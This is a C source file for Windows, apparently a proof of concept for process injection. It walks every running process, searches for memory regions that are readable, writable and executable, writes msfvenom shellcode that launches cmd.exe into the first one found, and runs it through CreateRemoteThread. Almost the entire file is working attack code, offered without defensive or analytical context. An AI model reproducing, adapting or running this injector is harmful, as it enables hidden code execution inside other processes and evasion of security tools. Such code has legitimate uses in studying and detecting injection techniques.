#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tchar.h>

LPVOID Hunt(DWORD processID)
{
	HMODULE hMod;
	DWORD cbNeeded;
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID);
	if (EnumProcessModules(process, &hMod, sizeof(hMod),
		&cbNeeded))
	{
		GetModuleBaseName(process, hMod, szProcessName,
			sizeof(szProcessName) / sizeof(TCHAR));
	}
	if (process) {
		_tprintf(TEXT("[*] Searching in %s  (PID: %u)..."), szProcessName, processID);

		long MaxAddress = 0x7fffffff;
		long address = 0;
		int c = 0;
		do
		{
			MEMORY_BASIC_INFORMATION m;

			int result = VirtualQueryEx(process, (LPVOID)address, &m, sizeof(MEMORY_BASIC_INFORMATION));
			if (m.AllocationProtect == PAGE_EXECUTE_READWRITE)
			{
				//Console.Write("{0}\n", m.BaseAddress.ToString("X4"));
				printf("YAAY - RWX found at 0x%x\n", m.BaseAddress);
				return m.BaseAddress;
			}
			else if( c > 50000 ){
				printf(".");
				c = 0;
			}
			else {
				c += 1;
			}
			if (address == (long)m.BaseAddress + (long)m.RegionSize)
				break;
			address = (long)m.BaseAddress + (long)m.RegionSize;
		} while (address <= MaxAddress);

		printf("Nope\n");
	}
	else {
		_tprintf(TEXT("[*] No Access for %s  (PID: %u) \n"), szProcessName, processID);
	}
	
	return 0;
}


void Exec(LPVOID address, DWORD processID)
{
	printf("[*] Exec Shellcode... ");
	// msfvenom -p windows/x64/exec CMD='"C:\Windows\System32\cmd.exe"' EXITFUNC=thread --platform Windows -f c
	char shellcode[] = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
	"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
	"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
	"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
	"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
	"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
	"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
	"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
	"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
	"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
	"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
	"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
	"\x00\x53\xff\xd5\x22\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73"
	"\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x63\x6d\x64\x2e\x65"
	"\x78\x65\x22\x00";

	
	HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
	WriteProcessMemory(procHandle, address, shellcode, sizeof(shellcode), 0);

	//hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
	LPVOID hThread = CreateRemoteThread(procHandle, 0, 0, (LPVOID)(address), 0, 0, 0);
	
	printf("Done \n");
	
}

int main()
{
	printf("Starting Search \n");
	//Boolean spaceFound = false;
	LPVOID spaceAddress = 0;
	// Search in current process takes forever in C, skipping for this PoC
	DWORD currentProc = GetCurrentProcessId();
	printf("Current PID: %d", (int)currentProc);
	// spaceAddress = Hunt(currentProc);
	if (spaceAddress > 0) {
		//Exec(spaceAddress, currentProc);
	}
	else {
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;
		EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);
		cProcesses = cbNeeded / sizeof(DWORD);

		// Print the name and process identifier for each process.

		for (i = 0; i < cProcesses; i++)
		{
			if (aProcesses[i] != 0 && aProcesses[i] != currentProc)
			{
				spaceAddress = Hunt(aProcesses[i]);
				if (spaceAddress > 0) {
					Exec(spaceAddress, aProcesses[i]);
					break;
				}
			}
		}
	}
	
	// sleep for a second to wait for the thread
	Sleep(10000);
	return 0;
}